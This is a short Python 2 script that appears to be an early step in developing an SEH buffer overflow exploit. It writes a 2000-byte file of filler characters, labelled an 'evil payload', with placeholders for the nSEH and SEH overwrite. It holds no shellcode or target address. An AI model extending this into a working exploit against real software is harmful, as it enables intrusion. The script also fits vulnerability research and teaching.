#!/usr/bin/python

nSEH = "B" * 4
SEH = "C" * 4

buffer  = "A" * 1249
buffer += "B" * 4
buffer += "C" * (2000 - len(buffer))

f=open("Payload.txt","w")
print "[+] Creating %s bytes evil payload.." %len(buffer)
f.write(buffer)
f.close()
print "[+] File created!"

